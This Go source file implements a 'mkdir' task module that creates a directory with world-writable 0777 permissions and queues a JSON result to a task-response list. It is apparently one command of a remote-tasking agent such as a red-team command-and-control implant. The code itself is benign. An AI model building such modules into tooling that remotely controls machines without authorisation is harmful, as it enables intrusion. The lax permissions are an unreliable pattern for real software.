package mkdir

import (
	"fmt"
	"os"

	"encoding/json"
	"pkg/profiles"
	"pkg/utils/structs"
	"sync"
)

var mu sync.Mutex

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	err := os.Mkdir(task.Params, 0777)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Created directory: %s", task.Params)
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
